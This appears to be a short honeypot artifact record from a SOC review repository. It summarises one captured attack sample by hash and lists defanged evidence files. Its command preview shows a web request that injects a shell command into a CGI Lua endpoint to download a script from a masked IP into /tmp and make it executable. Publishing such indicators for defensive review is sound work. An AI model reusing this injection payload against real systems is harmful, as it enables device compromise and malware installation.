# 7f8e8ddd1997937aaf22289dbfabcbbcb46f751c29c902fc25bc6c63b9bea511

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `7f8e8ddd1997937aaf22289dbfabcbbcb46f751c29c902fc25bc6c63b9bea511` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /cgi-bin/lua?cmd=os.execute("wget%20-O%20/tmp/kozak.sh%20hxxp://45[.]202[.]246[.]XXX/bins/kozak.sh;%20chmod%20+x%20/tmp/ko
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
